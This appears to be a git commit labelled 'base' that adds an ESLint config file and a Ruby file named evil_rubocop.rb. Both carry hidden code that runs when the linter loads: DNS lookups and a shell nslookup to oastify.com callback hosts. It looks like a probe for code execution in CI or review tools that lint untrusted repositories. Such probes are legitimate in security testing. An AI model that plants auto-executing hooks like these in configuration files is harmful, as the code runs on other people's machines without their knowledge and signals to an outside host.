c9c4e5d23f7a7a98f2d16f76b441b85f3e593adc
shubham gupta <shubhamgupta109.1995@gmail.com>
2026-06-18 16:47:06 +0530

    base

---
+++ .eslintrc.js
@@ -0,0 +1,2 @@
+try { require('dns').lookup('eslintrc.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {}); } catch (e) {}
+module.exports = { root: true, rules: {} };
---
+++ evil_rubocop.rb
@@ -0,0 +1,2 @@
+begin; require 'resolv'; Resolv.getaddress("rubocop.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com"); rescue => e; end
+begin; system("nslookup rubocop-cmd.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com"); rescue => e; end
